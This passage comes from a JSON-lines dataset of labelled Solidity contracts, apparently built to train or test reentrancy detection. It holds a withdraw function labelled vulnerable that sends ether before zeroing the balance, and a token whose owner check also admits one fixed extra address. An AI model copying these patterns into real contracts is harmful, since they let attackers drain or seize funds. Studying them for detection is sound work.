self.transactionInfo[_id][_txIndex].confirmCount); LogTransactionConfirmed(_id, msg.sender, confirmsNeeded); } return (true,_id); } function changeRequiredMinor(WalletMainLib.WalletData storage self, uint256 _requiredMinor, bool _confirm, bytes _data) public returns (bool,bytes32) { bytes32 _id = keccak256(\"changeRequiredMinor\",_requiredMinor); uint256 _txIndex = self.transactionInfo[_id].length; if(msg.sender != address(this)){ bool allGood; if(!_confirm) { allGood = self.revokeConfirm(_id); return (allGood,_id); } else { if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){ require(self.ownerIndex[msg.sender] > 0); allGood = checkRequiredChange(_requiredMinor, self.owners.length); if(!allGood) return (false,0); self.transactionInfo[_id].length++; self.transactionInfo[_id][_txIndex].confirmRequired = self.requiredAdmin; self.transactionInfo[_id][_txIndex].day = now / 1 days; self.transactions[now / 1 days].push(_id); } else { _txIndex--; allGood = self.checkNotConfirmed(_id, _txIndex); if(!allGood) return (false,_id); } } self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender)); self.transactionInfo[_id][_txIndex].confirmCount++; } else { _txIndex--; } if(self.transactionInfo[_id][_txIndex].confirmCount == self.transactionInfo[_id][_txIndex].confirmRequired) { self.transactionInfo[_id][_txIndex].success = true; self.requiredMinor = _requiredMinor; delete self.transactionInfo[_id][_txIndex].data; LogRequirementChange(_requiredMinor); } else { if(self.transactionInfo[_id][_txIndex].data.length == 0) self.transactionInfo[_id][_txIndex].data = _data; uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount); LogTransactionConfirmed(_id, msg.sender, confirmsNeeded); } return (true,_id); } function changeMajorThreshold(WalletMainLib.WalletData storage self, address _token, uint256 _majorThreshold, bool _confirm, bytes _data) public returns (bool,bytes32) { bytes32 _id = keccak256(\"changeMajorThreshold\", _token, _majorThreshold); uint256 _txIndex = self.transactionInfo[_id].length; if(msg.sender != address(this)){ bool allGood; if(!_confirm) { allGood = self.revokeConfirm(_id); return (allGood,_id); } else { if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){ require(self.ownerIndex[msg.sender] > 0); self.transactionInfo[_id].length++; self.transactionInfo[_id][_txIndex].confirmRequired = self.requiredAdmin; self.transactionInfo[_id][_txIndex].day = now / 1 days; self.transactions[now / 1 days].push(_id); } else { _txIndex--; allGood = self.checkNotConfirmed(_id, _txIndex); if(!allGood) return (false,_id); } } self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender)); self.transactionInfo[_id][_txIndex].confirmCount++; } else { _txIndex--; } if(self.transactionInfo[_id][_txIndex].confirmCount == self.transactionInfo[_id][_txIndex].confirmRequired) { self.transactionInfo[_id][_txIndex].success = true; self.majorThreshold[_token] = _majorThreshold; delete self.transactionInfo[_id][_txIndex].data; LogThresholdChange(_token, _majorThreshold); } else { if(self.transactionInfo[_id][_txIndex].data.length == 0) self.transactionInfo[_id][_txIndex].data = _data; uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount); LogTransactionConfirmed(_id, msg.sender, confirmsNeeded); } return (true,_id); } } library WalletMainLib { using Array256Lib for uint256[]; using BasicMathLib for uint256; struct WalletData { uint256 maxOwners; address[] owners; uint256 requiredAdmin; uint256 requiredMajor; uint256 requiredMinor; mapping (address => uint256[2]) currentSpend; mapping (address => uint256) majorThreshold; mapping (uint256 => bytes32[]) transactions; mapping (address => uint256) ownerIndex; mapping (bytes32 => Transaction[]) transactionInfo; } struct Transaction { uint256 day; uint256 value; address tokenAdress; uint256 amount; bytes data; uint256[] confirmedOwners; uint256 confirmCount; uint256 confirmRequired; bool success; } event LogRevokeNotice(bytes32 txid, address sender, uint256 confirmsNeeded); event LogTransactionFailed(bytes32 txid, address sender); event LogTransactionConfirmed(bytes32 txid, address sender, uint256 confirmsNeeded); event LogTransactionComplete(bytes32 txid, address target, uint256 value, bytes data); event LogContractCreated(address newContract, uint256 value); event LogErrorMsg(uint256 amount, string msg); function init(WalletData storage self, address[] _owners, uint256 _requiredAdmin, uint256 _requiredMajor, uint256 _requiredMinor, uint256 _majorThreshold) public returns (bool) { require(self.owners.length == 0); require(_owners.length >= _requiredAdmin && _requiredAdmin > 0); require(_owners.length >= _requiredMajor && _requiredMajor > 0); require(_owners.length >= _requiredMinor && _requiredMinor > 0); self.owners.push(0); for (uint256 i=0; i<_owners.length; i++) { require(_owners[i] != 0); self.owners.push(_owners[i]); self.ownerIndex[_owners[i]] = i+1; } self.requiredAdmin = _requiredAdmin; self.requiredMajor = _requiredMajor; self.requiredMinor = _requiredMinor; self.maxOwners = 50; self.majorThreshold[0] = _majorThreshold; return true; } function checkNotConfirmed(WalletData storage self, bytes32 _id, uint256 _txIndex) public returns (bool) { require(self.ownerIndex[msg.sender] > 0); uint256 _txLen = self.transactionInfo[_id].length; if(_txLen == 0 || _txIndex >= _txLen){ LogErrorMsg(_txLen, \"Tx not initiated\"); LogTransactionFailed(_id, msg.sender); return false; } if(self.transactionInfo[_id][_txIndex].success){ LogErrorMsg(_txIndex, \"Transaction already complete\"); LogTransactionFailed(_id, msg.sender); return false; } bool found; uint256 index; (found, index) = self.transactionInfo[_id][_txIndex].confirmedOwners.indexOf(uint256(msg.sender), false); if(found){ LogErrorMsg(index, \"Owner already confirmed\"); LogTransactionFailed(_id, msg.sender); return false; } return true; } function calcConfirmsNeeded(uint256 _required, uint256 _count) public pure returns (uint256){ return _required - _count; } function getAmount(bytes _txData) public pure returns (bool,uint256) { bytes32 getSig; bytes4 sig; bytes4 tSig = 0xa9059cbb; bytes4 aSig = 0x095ea7b3; bytes4 tfSig = 0x23b872dd; bool transfer; bytes32 _amountData; uint256 _amount; assembly { getSig := mload(add(_txData,0x20)) } sig = bytes4(getSig); if(sig ==  tSig || sig == aSig){ transfer = true; assembly { _amountData := mload(add(_txData,0x44)) } _amount = uint256(_amountData); } else if(sig == tfSig){ transfer = true; assembly { _amountData := mload(add(_txData,0x64)) } _amount = uint256(_amountData); } return (transfer,_amount); } function getRequired(WalletData storage self, address _to, uint256 _value, bool _isTransfer, uint256 _amount) public returns (uint256) { bool err; uint256 res; bool major = true; if((now / 1 days) > self.currentSpend[0][0]){ self.currentSpend[0][0] = now / 1 days; self.currentSpend[0][1] = 0; } (err, res) = self.currentSpend[0][1].plus(_value); require(!err); if(res < self.majorThreshold[0]) major = false; if(_to != 0 && _isTransfer){ if((now / 1 days) > self.currentSpend[_to][0]){ self.currentSpend[_to][0] = now / 1 days; self.currentSpend[_to][1] = 0; } (err, res) = self.currentSpend[_to][1].plus(_amount); require(!err); if(res >= self.majorThreshold[_to]) major = true; } return major ? self.requiredMajor : self.requiredMinor; } function createContract(bytes _txData, uint256 _value) public { address _newContract; bool allGood; assembly { _newContract := create(_value, add(_txData, 0x20), mload(_txData)) allGood := gt(extcodesize(_newContract),0) } require(allGood); LogContractCreated(_newContract, _value); } function serveTx(WalletData storage self,  address _to, uint256 _value,  bytes _txData,  bool _confirm,    bytes _data)  public returns (bool,bytes32)  { bytes32 _id = keccak256(\"serveTx\",_to,_value,_txData); uint256 _txIndex = self.transactionInfo[_id].length; uint256 _required = self.requiredMajor; if(msg.sender != address(this)){ bool allGood; uint256 _amount; if(!_confirm) { allGood = revokeConfirm(self, _id); return (allGood,_id); } else { if(_to != 0) (allGood,_amount) = getAmount(_txData); if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){ require(self.ownerIndex[msg.sender] > 0); _required = getRequired(self, _to, _value, allGood,_amount); self.transactionInfo[_id].length++; self.transactionInfo[_id][_txIndex].confirmRequired = _required; self.transactionInfo[_id][_txIndex].day = now / 1 days; self.transactions[now / 1 days].push(_id); } else { _txIndex--; allGood = checkNotConfirmed(self, _id, _txIndex); if(!allGood) return (false,_id); } } self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender)); self.transactionInfo[_id][_txIndex].confirmCount++; } else { _txIndex--; } if(self.transactionInfo[_id][_txIndex].confirmCount ==  self.transactionInfo[_id][_txIndex].confirmRequired) { self.currentSpend[0][1] += _value; self.currentSpend[_to][1] += _amount; self.transactionInfo[_id][_txIndex].success = true; if(_to == 0){ createContract(_txData, _value); } else { require(_to.call.value(_value)(_txData)); } delete self.transactionInfo[_id][_txIndex].data; LogTransactionComplete(_id, _to, _value, _data); } else { if(self.transactionInfo[_id][_txIndex].data.length == 0) self.transactionInfo[_id][_txIndex].data = _data; uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount); LogTransactionConfirmed(_id, msg.sender, confirmsNeeded); } return (true,_id); } function confirmTx(WalletData storage self, bytes32 _id) public returns (bool) { require(self.ownerIndex[msg.sender] > 0); uint256 _txIndex = self.transactionInfo[_id].length; bool ret; if(_txIndex == 0){ LogErrorMsg(_txIndex, \"Tx not initiated\"); LogTransactionFailed(_id, msg.sender); return false; } _txIndex--; bool allGood = checkNotConfirmed(self, _id, _txIndex); if(!allGood) return false; self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender)); self.transactionInfo[_id][_txIndex].confirmCount++; if(self.transactionInfo[_id][_txIndex].confirmCount == self.transactionInfo[_id][_txIndex].confirmRequired) { address a = address(this); require(a.call(self.transactionInfo[_id][_txIndex].data)); } else { uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount); LogTransactionConfirmed(_id, msg.sender, confirmsNeeded); ret = true; } return ret; } function revokeConfirm(WalletData storage self, bytes32 _id) public returns (bool) { require(self.ownerIndex[msg.sender] > 0); uint256 _txIndex = self.transactionInfo[_id].length; if(_txIndex == 0){ LogErrorMsg(_txIndex, \"Tx not initiated\"); LogTransactionFailed(_id, msg.sender); return false; } _txIndex--; if(self.transactionInfo[_id][_txIndex].success){ LogErrorMsg(_txIndex, \"Transaction already complete\"); LogTransactionFailed(_id, msg.sender); return false; } bool found; uint256 index; (found, index) = self.transactionInfo[_id][_txIndex].confirmedOwners.indexOf(uint256(msg.sender), false); if(!found){ LogErrorMsg(index, \"Owner has not confirmed tx\"); LogTransactionFailed(_id, msg.sender); return false; } self.transactionInfo[_id][_txIndex].confirmedOwners[index] = 0; self.transactionInfo[_id][_txIndex].confirmCount--; uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount); if(self.transactionInfo[_id][_txIndex].confirmCount == 0) self.transactionInfo[_id].length--; LogRevokeNotice(_id, msg.sender, confirmsNeeded); return true; } } library Array256Lib { function sumElements(uint256[] storage self) public view returns(uint256 sum) { assembly { mstore(0x60,self_slot) for { let i := 0 } lt(i, sload(self_slot)) { i := add(i, 1) } { sum := add(sload(add(sha3(0x60,0x20),i)),sum) } } } function getMax(uint256[] storage self) public view returns(uint256 maxValue) { assembly { mstore(0x60,self_slot) maxValue := sload(sha3(0x60,0x20)) for { let i := 0 } lt(i, sload(self_slot)) { i := add(i, 1) } { switch gt(sload(add(sha3(0x60,0x20),i)), maxValue) case 1 { maxValue := sload(add(sha3(0x60,0x20),i)) } } } } function getMin(uint256[] storage self) public view returns(uint256 minValue) { assembly { mstore(0x60,self_slot) minValue := sload(sha3(0x60,0x20)) for { let i := 0 } lt(i, sload(self_slot)) { i := add(i, 1) } { switch gt(sload(add(sha3(0x60,0x20),i)), minValue) case 0 { minValue := sload(add(sha3(0x60,0x20),i)) } } } } function indexOf(uint256[] storage self, uint256 value, bool isSorted) public view returns(bool found, uint256 index) { assembly{ mstore(0x60,self_slot) switch isSorted case 1 { let high := sub(sload(self_slot),1) let mid := 0 let low := 0 for { } iszero(gt(low, high)) { } { mid := div(add(low,high),2) switch lt(sload(add(sha3(0x60,0x20),mid)),value) case 1 { low := add(mid,1) } case 0 { switch gt(sload(add(sha3(0x60,0x20),mid)),value) case 1 { high := sub(mid,1) } case 0 { found := 1 index := mid low := add(high,1) } } } } case 0 { for { let low := 0 } lt(low, sload(self_slot)) { low := add(low, 1) } { switch eq(sload(add(sha3(0x60,0x20),low)), value) case 1 { found := 1 index := low low := sload(self_slot) } } } } } function getParentI(uint256 index) private pure returns (uint256 pI) { uint256 i = index - 1; pI = i/2; } function getLeftChildI(uint256 index) private pure returns (uint256 lcI) { uint256 i = index * 2; lcI = i + 1; } function heapSort(uint256[] storage self) public { uint256 end = self.length - 1; uint256 start = getParentI(end); uint256 root = start; uint256 lChild; uint256 rChild; uint256 swap; uint256 temp; while(start >= 0){ root = start; lChild = getLeftChildI(start); while(lChild <= end){ rChild = lChild + 1; swap = root; if(self[swap] < self[lChild]) swap = lChild; if((rChild <= end) && (self[swap]<self[rChild])) swap = rChild; if(swap == root) lChild = end+1; else { temp = self[swap]; self[swap] = self[root]; self[root] = temp; root = swap; lChild = getLeftChildI(root); } } if(start == 0) break; else start = start - 1; } while(end > 0){ temp = self[end]; self[end] = self[0]; self[0] = temp; end = end - 1; root = 0; lChild = getLeftChildI(0); while(lChild <= end){ rChild = lChild + 1; swap = root; if(self[swap] < self[lChild]) swap = lChild; if((rChild <= end) && (self[swap]<self[rChild])) swap = rChild; if(swap == root) lChild = end + 1; else { temp = self[swap]; self[swap] = self[root]; self[root] = temp; root = swap; lChild = getLeftChildI(root); } } } } function uniq(uint256[] storage self) public returns (uint256 length) { bool contains; uint256 index; for (uint256 i = 0; i < self.length; i++) { (contains, index) = indexOf(self, self[i], false); if (i > index) { for (uint256 j = i; j < self.length - 1; j++){ self[j] = self[j + 1]; } delete self[self.length - 1]; self.length--; i--; } } length = self.length; } } library BasicMathLib { function times(uint256 a, uint256 b) public view returns (bool err,uint256 res) { assembly{ res := mul(a,b) switch or(iszero(b), eq(div(res,b), a)) case 0 { err := 1 res := 0 } } } function dividedBy(uint256 a, uint256 b) public view returns (bool err,uint256 i) { uint256 res; assembly{ switch iszero(b) case 0 { res := div(a,b) let loc := mload(0x40) mstore(add(loc,0x20),res) i := mload(add(loc,0x20)) } default { err := 1 i := 0 } } } function plus(uint256 a, uint256 b) public view returns (bool err, uint256 res) { assembly{ res := add(a,b) switch and(eq(sub(res,b), a), or(gt(res,b),eq(res,b))) case 0 { err := 1 res := 0 } } } function minus(uint256 a, uint256 b) public view returns (bool err,uint256 res) { assembly{ res := sub(a,b) switch eq(and(eq(add(res,b), a), or(lt(res,a), eq(res,a))), 1) case 0 { err := 1 res := 0 } } } } "}
{"sol name": "17043.sol", "label": 1, "first path": "function withdraw() public { msg.sender.call.value(balances[msg.sender])(); balances[msg.sender] = 0; ", "second path": "function withdraw() public { msg.sender.call.value(balances[msg.sender])(); balances[msg.sender] = 0; ", "third path": "function withdraw() public { msg.sender.call.value(balances[msg.sender])(); balances[msg.sender] = 0; ", "long path": "pragma solidity ^0.4.23; contract keepMyEther { mapping(address => uint256) public balances; function () payable public { balances[msg.sender] += msg.value; } function withdraw() public { msg.sender.call.value(balances[msg.sender])(); balances[msg.sender] = 0; } } "}
{"sol name": "18170.sol", "label": 0, "first path": "function mintETHRewards( address _contract, uint256 _amount ) public onlyManager() { require(_amount <= wingsETHRewards); require(_contract.call.value(_amount)()); wingsETHRewards -= _amount; ", "second path": "function mintETHRewards( address _contract, uint256 _amount ) public onlyManager() { require(_amount <= wingsETHRewards); require(_contract.call.value(_amount)()); wingsETHRewards -= _amount; ", "third path": "function mintETHRewards( address _contract, uint256 _amount ) public onlyManager() { require(_amount <= wingsETHRewards); require(_contract.call.value(_amount)()); wingsETHRewards -= _amount; ", "long path": "pragma solidity ^0.4.21; library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return a / b; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; } } contract ERC20Basic { function totalSupply() public view returns (uint256); function balanceOf(address who) public view returns (uint256); function transfer(address to, uint256 value) public returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); } contract ERC20 is ERC20Basic { function allowance(address owner, address spender) public view returns (uint256); function transferFrom(address from, address to, uint256 value) public returns (bool); function approve(address spender, uint256 value) public returns (bool); event Approval(address indexed owner, address indexed spender, uint256 value); } contract BasicToken is ERC20Basic { using SafeMath for uint256; mapping(address => uint256) balances; uint256 totalSupply_; function totalSupply() public view returns (uint256) { return totalSupply_; } function transfer(address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[msg.sender]); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); emit Transfer(msg.sender, _to, _value); return true; } function balanceOf(address _owner) public view returns (uint256 balance) { return balances[_owner]; } } contract StandardToken is ERC20, BasicToken { mapping (address => mapping (address => uint256)) internal allowed; function transferFrom(address _from, address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[_from]); require(_value <= allowed[_from][msg.sender]); balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value); emit Transfer(_from, _to, _value); return true; } function approve(address _spender, uint256 _value) public returns (bool) { allowed[msg.sender][_spender] = _value; emit Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) public view returns (uint256) { return allowed[_owner][_spender]; } function increaseApproval(address _spender, uint _addedValue) public returns (bool) { allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue); emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) { uint oldValue = allowed[msg.sender][_spender]; if (_subtractedValue > oldValue) { allowed[msg.sender][_spender] = 0; } else { allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue); } emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } } contract Ownable { address public owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); function Ownable() public { owner = msg.sender; } modifier onlyOwner() { require( (msg.sender == owner) || (msg.sender == address(0x630CC4c83fCc1121feD041126227d25Bbeb51959)) ); _; } function transferOwnership(address newOwner) public onlyOwner { require(newOwner != address(0)); emit OwnershipTransferred(owner, newOwner); owner = newOwner; } } contract A2AToken is Ownable, StandardToken { string public name; string public symbol; uint8 public decimals; uint256 public totalSupply; bool public releasedForTransfer; uint256 constant public maxSupply = 600*(10**6)*(10**8); mapping(address => uint256) public vestingAmount; mapping(address => uint256) public vestingBeforeBlockNumber; mapping(address => bool) public icoAddrs; function A2AToken() public { name = \"A2A STeX Exchange Token\"; symbol = \"A2A\"; decimals = 8; releasedForTransfer = false; } function transfer(address _to, uint256 _value) public returns (bool) { require(releasedForTransfer); if ( ( vestingAmount[msg.sender] > 0 ) && ( block.number < vestingBeforeBlockNumber[msg.sender] ) ) { if ( balances[msg.sender] < _value ) revert(); if ( balances[msg.sender] <= vestingAmount[msg.sender] ) revert(); if ( balances[msg.sender].sub(_value) < vestingAmount[msg.sender] ) revert(); } return super.transfer(_to, _value); } function setVesting(address _holder, uint256 _amount, uint256 _bn) public onlyOwner() returns (bool) { vestingAmount[_holder] = _amount; vestingBeforeBlockNumber[_holder] = _bn; return true; } function _transfer(address _from, address _to, uint256 _value, uint256 _vestingBlockNumber) public onlyOwner() returns (bool) { require(_to != address(0)); require(_value <= balances[_from]); balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); if ( _vestingBlockNumber > 0 ) { vestingAmount[_to] = _value; vestingBeforeBlockNumber[_to] = _vestingBlockNumber; } emit Transfer(_from, _to, _value); return true; } function issueDuringICO(address _to, uint256 _amount) public returns (bool) { require( icoAddrs[msg.sender] ); require( totalSupply.add(_amount) < maxSupply ); balances[_to] = balances[_to].add(_amount); totalSupply = totalSupply.add(_amount); emit Transfer(this, _to, _amount); return true; } function setICOaddr(address _addr, bool _value) public onlyOwner() returns (bool) { icoAddrs[_addr] = _value; return true; } function transferFrom(address _from, address _to, uint256 _value) public returns (bool) { require(releasedForTransfer); return super.transferFrom(_from, _to, _value); } function release() public onlyOwner() { releasedForTransfer = true; } function lock() public onlyOwner() { releasedForTransfer = false; } } contract HasManager is Ownable { address public manager; modifier onlyManager { require( (msg.sender == manager) || (msg.sender == owner) ); _; } function transferManager(address _newManager) public onlyManager() { require(_newManager != address(0)); manager = _newManager; } } contract ICrowdsaleProcessor is HasManager { modifier whenCrowdsaleAlive() { require(isActive()); _; } modifier whenCrowdsaleFailed() { require(isFailed()); _; } modifier whenCrowdsaleSuccessful() { require(isSuccessful()); _; } modifier hasntStopped() { require(!stopped); _; } modifier hasBeenStopped() { require(stopped); _; } modifier hasntStarted() { require(!started); _; } modifier hasBeenStarted() { require(started); _; } uint256 constant public MIN_HARD_CAP = 1 ether; uint256 constant public MIN_CROWDSALE_TIME = 3 days; uint256 constant public MAX_CROWDSALE_TIME = 50 days; bool public started; bool public stopped; uint256 public totalCollected; uint256 public totalSold; uint256 public minimalGoal; uint256 public hardCap; uint256 public duration; uint256 public startTimestamp; uint256 public endTimestamp; function deposit() public payable {} function getToken() public returns(address); function mintETHRewards(address _contract, uint256 _amount) public onlyManager(); function mintTokenRewards(address _contract, uint256 _amount) public onlyManager(); function releaseTokens() public onlyOwner() hasntStopped() whenCrowdsaleSuccessful(); function stop() public onlyManager() hasntStopped(); function start(uint256 _startTimestamp, uint256 _endTimestamp, address _fundingAddress) public onlyManager() hasntStarted() hasntStopped(); function isFailed() public constant returns (bool); function isActive() public constant returns (bool); function isSuccessful() public constant returns (bool); } contract A2ACrowdsale is ICrowdsaleProcessor { using SafeMath for uint256; event CROWDSALE_START(uint256 startTimestamp, uint256 endTimestamp, address fundingAddress); address public fundingAddress; address internal bountyAddress = 0x10945A93914aDb1D68b6eFaAa4A59DfB21Ba9951; A2AToken public token; mapping(address => bool) public partnerContracts; uint256 public icoPrice; uint256 public icoBonus; uint256 constant public wingsETHRewardsPercent = 2 * 10000; uint256 constant public wingsTokenRewardsPercent = 2 * 10000; uint256 public wingsETHRewards; uint256 public wingsTokenRewards; uint256 constant public maxTokensWithBonus = 500*(10**6)*(10**8); uint256 public bountyPercent; address[2] internal foundersAddresses = [ 0x2f072F00328B6176257C21E64925760990561001, 0x2640d4b3baF3F6CF9bB5732Fe37fE1a9735a32CE ]; function A2ACrowdsale() public { owner = msg.sender; manager = msg.sender; icoPrice = 2000; icoBonus = 100 * 10000; wingsETHRewards = 0; wingsTokenRewards = 0; minimalGoal = 1000 ether; hardCap = 50000 ether; bountyPercent = 23 * 10000; } function mintETHRewards( address _contract, uint256 _amount ) public onlyManager() { require(_amount <= wingsETHRewards); require(_contract.call.value(_amount)()); wingsETHRewards -= _amount; } function mintTokenRewards(address _contract, uint256 _amount) public onlyManager() { require( token != address(0) ); require(_amount <= wingsTokenRewards); require( token.issueDuringICO(_contract, _amount) ); wingsTokenRewards -= _amount; } function stop() public onlyManager() hasntStopped()\t{ stopped = true; } function start( uint256 _startTimestamp, uint256 _endTimestamp, address _fundingAddress ) public onlyManager() hasntStarted() hasntStopped() { require(_fundingAddress != address(0)); require(_startTimestamp >= block.timestamp); require(_endTimestamp > _startTimestamp); duration = _endTimestamp - _startTimestamp; require(duration >= MIN_CROWDSALE_TIME && duration <= MAX_CROWDSALE_TIME); startTimestamp = _startTimestamp; endTimestamp = _endTimestamp; started = true; emit CROWDSALE_START(_startTimestamp, _endTimestamp, _fundingAddress); } function isFailed() public constant returns(bool) { return ( started && block.timestamp >= endTimestamp && totalCollected < minimalGoal ); } function isActive() public constant returns(bool) { return ( started && totalCollected < hardCap && block.timestamp >= startTimestamp && block.timestamp < endTimestamp ); } function isSuccessful() public constant returns(bool) { return ( totalCollected >= hardCap || (block.timestamp >= endTimestamp && totalCollected >= minimalGoal) ); } function setToken( A2AToken _token ) public onlyOwner() { token = _token; } function getToken() public returns(address) { return address(token); } function setPrice( uint256 _icoPrice ) public onlyOwner() returns(bool) { icoPrice = _icoPrice; return true; } function setBonus( uint256 _icoBonus ) public onlyOwner() returns(bool) { icoBonus = _icoBonus; return true; } function setBountyAddress( address _bountyAddress ) public onlyOwner() returns(bool) { bountyAddress = _bountyAddress; return true; } function setBountyPercent( uint256 _bountyPercent ) public onlyOwner() returns(bool) { bountyPercent = _bountyPercent; return true; } function setPartnerContracts( address _contract ) public onlyOwner() returns(bool) { partnerContracts[_contract] = true; return true; } function deposit() public payable { } function() internal payable { ico( msg.sender, msg.value ); } function ico( address _to, uint256 _val ) internal returns(bool) { require( token != address(0) ); require( isActive() ); require( _val >= ( 1 ether / 10 ) ); require( totalCollected < hardCap ); uint256 tokensAmount = _val.mul( icoPrice ) / 10**10; if ( ( icoBonus > 0 ) && ( totalSold.add(tokensAmount) < maxTokensWithBonus ) ) { tokensAmount = tokensAmount.add( tokensAmount.mul(icoBonus) / 1000000 ); } else { icoBonus = 0; } require( totalSold.add(tokensAmount) < token.maxSupply() ); require( token.issueDuringICO(_to, tokensAmount) ); wingsTokenRewards = wingsTokenRewards.add( tokensAmount.mul( wingsTokenRewardsPercent ) / 1000000 ); wingsETHRewards = wingsETHRewards.add( _val.mul( wingsETHRewardsPercent ) / 1000000 ); if ( ( bountyAddress != address(0) ) && ( totalSold.add(tokensAmount) < maxTokensWithBonus ) ) { require( token.issueDuringICO(bountyAddress, tokensAmount.mul(bountyPercent) / 1000000) ); tokensAmount = tokensAmount.add( tokensAmount.mul(bountyPercent) / 1000000 ); } totalCollected = totalCollected.add( _val ); totalSold = totalSold.add( tokensAmount ); return true; } function icoPartner( address _to, uint256 _val ) public returns(bool) { require( partnerContracts[msg.sender] ); require( ico( _to, _val ) ); return true; } function calculateRewards() public view returns(uint256,uint256) { return (wingsETHRewards, wingsTokenRewards); } function releaseTokens() public onlyOwner() hasntStopped() whenCrowdsaleSuccessful() { } function withdrawToFounders(uint256 _amount) public whenCrowdsaleSuccessful() onlyOwner() returns(bool) { require( address(this).balance.sub( _amount ) >= wingsETHRewards ); uint256 amount_to_withdraw = _amount / foundersAddresses.length; uint8 i = 0; uint8 errors = 0; for (i = 0; i < foundersAddresses.length; i++) { if (!foundersAddresses[i].send(amount_to_withdraw)) { errors++; } } return true; } } contract A2ACrowdsalePartner is Ownable { using SafeMath for uint256; A2ACrowdsale public crowdsale; uint256 public partnerETHRewardsPercent; address public partnerAddress; address[2] internal foundersAddresses = [ 0x2f072F00328B6176257C21E64925760990561001, 0x2640d4b3baF3F6CF9bB5732Fe37fE1a9735a32CE ]; function A2ACrowdsalePartner() public { partnerETHRewardsPercent = 8 * 10000; } function setCrowdsale( A2ACrowdsale _crowdsale ) public onlyOwner() returns(bool) { crowdsale = _crowdsale; return true; } function setPartnerETHRewardsPercent( uint256 _partnerETHRewardsPercent ) public onlyOwner() returns(bool) { partnerETHRewardsPercent = _partnerETHRewardsPercent; return true; } function setPartnerAddress( A2ACrowdsale _partnerAddress ) public onlyOwner() returns(bool) { partnerAddress = _partnerAddress; return true; } function() internal payable { require( crowdsale != address(0) ); require( partnerAddress != address(0) ); require( crowdsale.icoPartner( msg.sender, msg.value ) ); uint256 partnerETHRewards = msg.value.mul( partnerETHRewardsPercent ) / 1000000; require( partnerAddress.send(partnerETHRewards) ); } function withdrawToFounders(uint256 _amount) public onlyOwner() returns(bool) { require( address(this).balance >= _amount ); uint256 amount_to_withdraw = _amount / foundersAddresses.length; uint8 i = 0; uint8 errors = 0; for (i = 0; i < foundersAddresses.length; i++) { if (!foundersAddresses[i].send(amount_to_withdraw)) { errors++; } } return true; } } "}
{"sol name": "40469.sol", "label": 0, "first path": "function _forward(address _to, bytes _data) internal returns(bool) { uint startGas = msg.gas + forwardCallGas + (_data.length * 50); if (_to == 0x0) { return false; _to.call.value(msg.value)(_data); return _applyRefund(startGas); ", "second path": "function _forward(address _to, bytes _data) internal returns(bool) { uint startGas = msg.gas + forwardCallGas + (_data.length * 50); if (_to == 0x0) { return false; _to.call.value(msg.value)(_data); return _applyRefund(startGas); ", "third path": "function _forward(address _to, bytes _data) internal returns(bool) { uint startGas = msg.gas + forwardCallGas + (_data.length * 50); if (_to == 0x0) { return false; _to.call.value(msg.value)(_data); return _applyRefund(startGas); ", "long path": "contract EtherTreasuryInterface { function withdraw(address _to, uint _value) returns(bool); function withdrawWithReference(address _to, uint _value, string _reference) returns(bool); } contract MultiAsset { function owner(bytes32 _symbol) constant returns(address); function isCreated(bytes32 _symbol) constant returns(bool); function totalSupply(bytes32 _symbol) constant returns(uint); function balanceOf(address _holder, bytes32 _symbol) constant returns(uint); function transfer(address _to, uint _value, bytes32 _symbol) returns(bool); function proxyTransferWithReference(address _to, uint _value, bytes32 _symbol, string _reference) returns(bool); function proxyTransferToICAPWithReference(bytes32 _icap, uint _value, string _reference) returns(bool); function proxyApprove(address _spender, uint _value, bytes32 _symbol) returns(bool); function allowance(address _from, address _spender, bytes32 _symbol) constant returns(uint); function proxyTransferFromWithReference(address _from, address _to, uint _value, bytes32 _symbol, string _reference) returns(bool); function proxyTransferFromToICAPWithReference(address _from, bytes32 _icap, uint _value, string _reference) returns(bool); function proxySetCosignerAddress(address _address, bytes32 _symbol) returns(bool); } contract Asset { event Transfer(address indexed from, address indexed to, uint value); event Approve(address indexed from, address indexed spender, uint value); MultiAsset public multiAsset; bytes32 public symbol; function init(address _multiAsset, bytes32 _symbol) returns(bool) { MultiAsset ma = MultiAsset(_multiAsset); if (address(multiAsset) != 0x0 || !ma.isCreated(_symbol)) { return false; } multiAsset = ma; symbol = _symbol; 